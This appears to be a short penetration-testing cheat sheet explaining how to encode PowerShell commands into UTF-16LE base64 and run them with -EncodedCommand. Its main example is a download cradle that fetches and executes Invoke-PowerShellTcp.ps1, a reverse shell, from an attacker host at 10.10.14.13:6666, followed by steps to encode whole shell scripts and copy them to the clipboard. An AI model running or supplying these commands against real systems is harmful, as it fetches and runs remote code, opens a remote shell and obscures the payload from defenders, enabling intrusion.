# Run Encoded Powershell


## Convert Powershell command to UTF-16LE

```bash
echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE
```

## Convert Powershell command to UTF-16LE and Base64

```bash
echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

## Convert Powershell file to UTF-16LE and Base64

```bash
cat powershelltcp.ps1 | iconv --to-code UTF-16LE | base64 -w 0
```

## Convert Powershell file to UTF-16LE and Base64 and copy to clipboard

```bash
cat powershelltcp.ps1 | iconv --to-code UTF-16LE | base64 -w 0 | xclip -selection clipboard
```

## Run with Powershell -encodedcommand

```bash
powershell -EncodedCommand <encodedcommand>
```
